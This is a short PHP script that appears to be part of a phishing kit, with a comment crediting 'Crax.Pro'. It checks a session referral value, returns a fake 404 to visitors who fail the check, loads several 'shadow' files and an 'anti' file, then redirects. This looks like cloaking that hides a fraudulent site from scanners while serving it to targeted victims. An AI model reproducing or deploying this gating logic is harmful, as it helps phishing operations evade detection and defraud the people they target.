<?php
/*                                 
Now it's Crax.Pro time 
*/
if  (isset($_SESSION['refData'])){
if ($_SESSION['refData'] != $_SESSION['redirectlink']) {
        exit(header('HTTP/1.0 404 Not Found'));
    }
}else{
                exit(header('HTTP/1.0 404 Not Found'));
    }
  	require 'shadow1.php';
	require 'shadow2.php';
	require 'shadow3.php';
	require 'shadow4.php';
	require 'shadow5.php';
	require 'shadow6.php';
	require 'shadow7.php';
	require 'shadow8.php';
	require 'anti3.php';
	exit(header("Location: ../index.php"));
?>